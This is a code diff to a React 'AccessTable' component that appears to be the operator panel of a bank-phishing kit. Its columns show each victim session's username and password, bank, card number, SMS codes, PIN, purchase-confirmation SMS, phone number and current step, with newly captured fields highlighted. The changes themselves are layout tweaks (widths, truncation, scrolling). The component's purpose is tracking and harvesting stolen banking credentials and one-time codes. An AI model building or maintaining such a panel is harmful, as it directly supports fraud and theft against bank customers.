@@ -334,7 +334,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
 
   if (isLoading) {
     return (
-      <div className="px-6 pt-2 pb-6 overflow-auto flex-1 mobile-scrollable" style={{maxHeight: "calc(100vh - 250px)", height: "auto"}}>
+      <div className="px-6 pt-2 pb-6 overflow-x-auto overflow-y-auto flex-1 mobile-scrollable" style={{maxHeight: "calc(100vh - 250px)", height: "auto", width: "100%"}}>
         <div className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
           <div className="p-4">
             <Skeleton className="h-8 w-full mb-4" />
@@ -355,7 +355,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
   };
   
   return (
-    <div className="px-6 pt-2 pb-6 overflow-auto flex-1 mobile-scrollable" style={{maxHeight: "calc(100vh - 250px)", height: "auto"}}>
+    <div className="px-6 pt-2 pb-6 overflow-x-auto overflow-y-auto flex-1 mobile-scrollable" style={{maxHeight: "calc(100vh - 250px)", height: "auto", width: "100%"}}>
       {/* Diálogo de confirmación de eliminación */}
       <DeleteConfirmDialog 
         isOpen={isDeleteDialogOpen}
@@ -558,23 +558,23 @@ const AccessTable: React.FC<AccessTableProps> = ({
         </>
       ) : (
         /* Vista para desktop: tabla */
-        <div className="overflow-x-auto">
-          <table className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
+        <div className="overflow-x-auto w-full">
+          <table className="min-w-full bg-[#1e1e1e] rounded-lg overflow-hidden" style={{tableLayout: "fixed"}}>
             <thead>
               <tr className="bg-[#222]">
-                <th className="p-3 text-left">#</th>
-                <th className="p-3 text-left">Folio</th>
-                <th className="p-3 text-left">User:Password</th>
-                <th className="p-3 text-left">Banco</th>
-                <th className="p-3 text-left">Tarjeta</th>
-                <th className="p-3 text-left">SMS</th>
-                <th className="p-3 text-left">NIP</th>
-                <th className="p-3 text-left">SMS COMPRA</th>
-                <th className="p-3 text-left">QR</th>
-                <th className="p-3 text-left">Celular</th>
-                <th className="p-3 text-left">Paso actual</th>
-                <th className="p-3 text-left">Creado por</th>
-                <th className="p-3 text-left">Acciones</th>
+                <th className="p-3 text-left w-[40px]">#</th>
+                <th className="p-3 text-left w-[80px]">Folio</th>
+                <th className="p-3 text-left w-[120px]">User:Password</th>
+                <th className="p-3 text-left w-[100px]">Banco</th>
+                <th className="p-3 text-left w-[150px]">Tarjeta</th>
+                <th className="p-3 text-left w-[80px]">SMS</th>
+                <th className="p-3 text-left w-[80px]">NIP</th>
+                <th className="p-3 text-left w-[100px]">SMS COMPRA</th>
+                <th className="p-3 text-left w-[100px]">QR</th>
+                <th className="p-3 text-left w-[80px]">Celular</th>
+                <th className="p-3 text-left w-[100px]">Paso actual</th>
+                <th className="p-3 text-left w-[100px]">Creado por</th>
+                <th className="p-3 text-left w-[120px]">Acciones</th>
               </tr>
             </thead>
             <tbody>
@@ -602,8 +602,8 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       ? `${session.username}:${session.password}` 
                       : '--'}
                   </td>
-                  <td className="p-3 text-[#ccc]">{session.banco}</td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className="p-3 text-[#ccc] truncate">{session.banco}</td>
+                  <td className={`p-3 overflow-hidden ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.tarjeta ? (
                       <div>
                         <div>{session.tarjeta}</div>
@@ -616,13 +616,13 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     ) : '--'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.sms || '--'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.nip || '--'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.smsCompra || '--'}
                   </td>
                   <td className="p-3 text-[#ccc]">
@@ -641,15 +641,15 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </Button>
                     ) : '--'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.celular || '--'}
                   </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.pasoActual ? 
                       session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) 
                       : 'Inicio'}
                   </td>
-                  <td className="p-3 text-[#ccc]">{session.createdBy || '--'}</td>
+                  <td className="p-3 text-[#ccc] truncate">{session.createdBy || '--'}</td>
                   <td className="p-3 flex gap-2">
                     {!session.saved && (
                       <Button 
